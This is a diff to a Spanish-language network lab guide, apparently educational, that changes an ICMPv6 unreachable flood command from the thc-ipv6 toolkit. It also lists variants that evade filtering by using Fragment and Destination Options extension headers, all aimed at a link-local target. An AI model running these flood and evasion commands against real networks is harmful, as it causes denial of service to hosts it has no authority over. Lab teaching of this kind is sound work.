@@ -33,7 +33,7 @@ Neighbor Solitication requests.*  From https://www.kali.org/tools/thc-ipv6/
 
 >***atk6-flood_unreachable:** Flood the target with ICMPv6 unreachable packets.*
 * Desde **PC3**
-  *  Lanzar el ataque ejecutando: `atk6-flood_unreach6 eth1 fe80::20`
+  *  Lanzar el ataque ejecutando: `atk6-flood_unreach6 -F eth1 fe80::20`
   * Alternativas de evasión a filtrado usando campos de extensión: 
   * Next Header field value 44 (Fragment) `atk6-flood_unreach6 -F eth1 fe80::20`
   * Next Header field value 60 (Destination Options) `atk6-flood_unreach6 -D eth1 fe80::20`
